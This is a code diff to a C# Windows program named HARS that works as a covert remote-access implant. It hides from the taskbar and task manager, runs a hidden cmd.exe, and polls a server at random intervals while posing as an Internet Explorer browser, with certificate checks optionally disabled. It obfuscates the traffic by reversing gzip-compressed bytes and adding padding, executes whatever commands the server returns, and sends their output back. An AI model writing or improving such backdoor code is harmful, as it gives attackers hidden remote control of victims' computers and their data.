@@ -16,7 +16,9 @@ using System.Text.RegularExpressions;
 using System.Threading;
 using System.Web;
 using System.Windows.Forms;
-using BrotliSharpLib;
+using System.IO.Pipes;
+using System.Security.Principal;
+using System.IO.Compression;
 
 namespace HARS
 {
@@ -25,8 +27,25 @@ namespace HARS
         // Global
         ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe");
         Process readProcess = new Process();
-        string cmd = "";
-        string reply = "";
+        String outputBuffer = "";
+
+        void OutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            // Collect the sort command output.
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                outputBuffer += outLine.Data + "\n";
+            }
+        }
+
+        void ErrorHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            // Collect the sort command output.
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                outputBuffer += outLine.Data + "\n";
+            }
+        }
 
         public Main()
         {
@@ -41,6 +60,7 @@ namespace HARS
             // Hide app from taskbar
             this.ShowInTaskbar = false;
             // Init shell process
+
             startInfo.RedirectStandardOutput = true;
             startInfo.RedirectStandardInput = true;
             startInfo.RedirectStandardError = true;
@@ -48,13 +68,14 @@ namespace HARS
             startInfo.CreateNoWindow = true;
             startInfo.UseShellExecute = false;
             startInfo.StandardOutputEncoding = Encoding.GetEncoding(437);
+            readProcess.OutputDataReceived += OutputHandler;
+            readProcess.ErrorDataReceived += ErrorHandler;
             readProcess.StartInfo = startInfo;
-            readProcess.OutputDataReceived += new DataReceivedEventHandler(IO.readProcess_OutputDataReceived);
-            readProcess.ErrorDataReceived += new DataReceivedEventHandler(IO.readProcess_ErrorDataReceived);
             readProcess.Start();
             readProcess.BeginOutputReadLine();
             readProcess.BeginErrorReadLine();
         }
+        
 
         // Hide app from task manager
         protected override CreateParams CreateParams
@@ -66,29 +87,17 @@ namespace HARS
                 return cp;
             }
         }
-
-        private void Exec(string command)
-        {
-            string cmd = command;
-            IO.stdout = "";
-            IO.stderr = "";
-            IO.firstline = true;
-            readProcess.StandardInput.WriteLine(cmd + " & echo END_FLAG");
-        }
-
+        
         private void button1_Click(object sender, EventArgs e)
         {
 
         }
 
         // Ask server for instructions
-        private bool FetchCmd()
+        private bool FetchCmdAndExec()
         {
             try
             {
-                MemoryStream memoryStream = new MemoryStream(0x10000);
-                byte[] buffer = new byte[0x10000];
-                Byte[] response = null;
                 if (Config.AllowInsecureCertificate)
                     ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
                 ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
@@ -96,19 +105,24 @@ namespace HARS
                 req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                 req.UserAgent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
                 req.Headers.Add("Accept-Encoding","gzip, deflate, br");
-                using (Stream responseStream = req.GetResponse().GetResponseStream())
+                
+
+                var buffer = default(byte[]);
+                using (var memstream = new MemoryStream())
                 {
-                    int bytes;
-                    while ((bytes = responseStream.Read(buffer, 0, buffer.Length)) > 0)
-                    {
-                        memoryStream.Write(buffer, 0, bytes);
-                    }
+                    req.GetResponse().GetResponseStream().CopyTo(memstream);
+                    buffer = memstream.ToArray();
                 }
+
+                String cmd = null;
                 if (buffer.Length != 0)
                 {
-                    byte[] uncompressedResponse = Brotli.DecompressBuffer(buffer, 0, buffer.Length);
-                    cmd = Encoding.ASCII.GetString(uncompressedResponse);
+                    Array.Reverse(buffer);
+                    buffer = GZDecompress(buffer);
+                    cmd = Encoding.ASCII.GetString(buffer);
                     cmd = cmd.Replace("XXPADDINGXXPADDINGXXPADDINGXX", "");
+                    readProcess.StandardInput.Write(cmd);
+                    readProcess.StandardInput.Flush();
                 }
                 return true;
             }
@@ -124,6 +138,7 @@ namespace HARS
             String responseString;
             try
             {
+                String reply = null;
                 if (Config.AllowInsecureCertificate)
                     ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
                 ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
@@ -132,16 +147,25 @@ namespace HARS
                 req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                 req.UserAgent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
                 req.Headers.Add("Accept-Encoding", "gzip, deflate, br");
-                Byte[] replyByte = Encoding.ASCII.GetBytes("XXPADDINGXXPADDINGXXPADDINGXX" + reply);
-                byte[] compressedReply = Brotli.CompressBuffer(replyByte, 0, replyByte.Length);
-                req.ContentLength = compressedReply.Length;
-                Stream dataStream = req.GetRequestStream();
-                dataStream.Write(compressedReply, 0, compressedReply.Length);
-                HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
-                using (Stream stream = resp.GetResponseStream())
+
+                if (outputBuffer.Length > 0)
                 {
-                    StreamReader reader = new StreamReader(stream, Encoding.UTF8);
-                    responseString = reader.ReadToEnd();
+
+                    reply = outputBuffer;
+                    outputBuffer = "";
+
+                    Byte[] replyByte = Encoding.ASCII.GetBytes("XXPADDINGXXPADDINGXXPADDINGXX" + reply);
+                    byte[] compressedReply = GZCompress(replyByte);
+                    Array.Reverse(compressedReply);
+                    req.ContentLength = compressedReply.Length;
+                    Stream dataStream = req.GetRequestStream();
+                    dataStream.Write(compressedReply, 0, compressedReply.Length);
+                    HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
+                    using (Stream stream = resp.GetResponseStream())
+                    {
+                        StreamReader reader = new StreamReader(stream, Encoding.UTF8);
+                        responseString = reader.ReadToEnd();
+                    }
                 }
                 return true;
             }
@@ -153,14 +177,6 @@ namespace HARS
 
         private void Main_Load(object sender, EventArgs e)
         {
-
-            // Initialise connection to server
-            /*if (!Init())
-            {
-                // Exit if server dont reply "hello"
-                Environment.Exit(0);
-            }*/
-            // Acting forever..
             while (true)
             {
                 try
@@ -169,54 +185,15 @@ namespace HARS
                     Random rnd = new Random();
                     int delay = rnd.Next(Config.MinDelay, Config.MaxDelay);
                     Thread.Sleep(TimeSpan.FromSeconds(delay));
-                    // Request server if cmd empty
-                    if (cmd == "")
-                    {
-                        FetchCmd();
-                    }
+                    FetchCmdAndExec();
                     // Or reply to server with cmd result
-                    else
-                    {
-                        if (cmd == "exit")
-                        {
-                            reply = "EXIT OK";
-                            ReplyCmd();
-                            readProcess.StandardInput.WriteLine("exit");
-                            readProcess.WaitForExit();
-                            Environment.Exit(0);
-                        }
-                        Exec(cmd);
-                        //while (!IO.stderr.Contains("END_FLAG") && !IO.stdout.Contains("END_FLAG"))
-                        //{
-                            Thread.Sleep(100);
-                        //}
-                        if (IO.stderr.Length > 2)
-                        {
-                            reply = IO.stderr;
-                        }
-                        else
-                        {
-                            try
-                            {
-                                IO.stdout = IO.stdout.Remove(IO.stdout.TrimEnd().LastIndexOf(Environment.NewLine));
-                            }
-                            catch
-                            {
-                                // Nothing
-                            }
-                            reply = IO.stdout;
-                        }
-                        //reply = reply.Replace("  & echo END_FLAG", "");
-                        ReplyCmd();
-                        IO.stdout = "";
-                        IO.stderr = "";
-                        cmd = "";
-                        reply = "";
-                    }
+                    Thread.Sleep(1000);
+                    ReplyCmd();
                 }
                 // Exit if error
-                catch
+                catch(Exception ex)
                 {
+                    Console.WriteLine(ex);
                     Environment.Exit(0);
                 }
             }
@@ -230,6 +207,28 @@ namespace HARS
         private void Button1_Click_1(object sender, EventArgs e)
         {
 
+        }
+
+        static byte[] GZCompress(byte[] data)
+        {
+            using (var compressedStream = new MemoryStream())
+            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Compress))
+            {
+                zipStream.Write(data, 0, data.Length);
+                zipStream.Close();
+                return compressedStream.ToArray();
+            }
+        }
+
+        static byte[] GZDecompress(byte[] data)
+        {
+            using (var compressedStream = new MemoryStream(data))
+            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
+            using (var resultStream = new MemoryStream())
+            {
+                zipStream.CopyTo(resultStream);
+                return resultStream.ToArray();
+            }
         }
     }
 }
